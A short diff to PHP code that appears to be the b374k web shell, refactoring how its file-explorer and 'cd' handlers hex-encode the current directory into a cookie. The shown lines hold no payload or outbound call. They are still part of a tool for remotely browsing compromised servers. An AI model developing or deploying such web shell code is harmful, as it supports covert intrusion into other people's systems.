@@ -16,15 +16,18 @@ $cwd = html_safe(get_cwd());
 $GLOBALS['module'] = array();
 
 /*foreach ($p as $key => $value) {
-    error_log($key."->".$value);
+    error_log("b374k> ".$key."=".$value);
 }*/
+function encode_cwd($cwd) {
+    return bin2hex($cwd);
+}
 
 $explorer_content = "";
 if(isset($p['viewEntry'])){
 	$path = trim($p['viewEntry']);
 	if(is_file($path)){
 		$dirname = realpath(dirname($path)).DIRECTORY_SEPARATOR;
-		setcookie("cwd", bin2hex($dirname));
+		setcookie("cwd", encode_cwd($dirname));
 		chdir($dirname);
 		$nav = get_nav($dirname);
 		$cwd = html_safe($dirname);
@@ -32,7 +35,7 @@ if(isset($p['viewEntry'])){
 	}
 	elseif(is_dir($path)){
 		$path = realpath($path).DIRECTORY_SEPARATOR;
-		setcookie("cwd", bin2hex($path));
+		setcookie("cwd", encode_cwd($path));
 		chdir($path);
 		$nav = get_nav($path);
 		$cwd = html_safe($path);
@@ -102,7 +105,7 @@ if(isset($p['cd'])){
 	if(is_dir($path)){
 		chdir($path);
 		$path = $path.DIRECTORY_SEPARATOR;
-		setcookie("cwd", bin2hex($path));
+		setcookie("cwd", encode_cwd($path));
 		$res = $path."{[|b374k|]}".get_nav($path)."{[|b374k|]}";
 		if(isset($p['showfiles'])&&($p['showfiles']=='true')){
 			$res .= show_all_files($path);
